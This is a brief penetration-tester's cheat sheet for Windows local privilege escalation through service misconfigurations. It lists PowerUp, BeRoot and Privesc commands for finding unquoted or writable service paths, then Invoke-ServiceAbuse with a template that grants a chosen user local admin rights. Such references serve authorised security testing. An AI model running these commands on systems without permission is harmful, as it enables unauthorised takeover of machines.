# **Focusing on Service issues**

## 1. Privesc check all
https://github.com/enjoiz/Privesc
```
. .\privesc.ps1
```
```
Invoke-PrivEsc
```

## 2. Beroot check all
https://github.com/AlessandroZ/BeRoot
```
./beRoot.exe
```

## 3. Run powerup check all
https://github.com/HarmJ0y/PowerUp
```
. ./powerup
```
```
Invoke-allchecks
```

Run powerup get services with unqouted paths and a space in their name
```
Get-ServiceUnquoted -Verbose
```
```
Get-ModifiableServiceFile -Verbose
```

## Exploitation
Abuse service to get local admin permissions with powerup
```
Invoke-ServiceAbuse
```
```
Invoke-ServiceAbuse -Name 'SERVICE_NAME' -UserName '<domain>\<username>'
```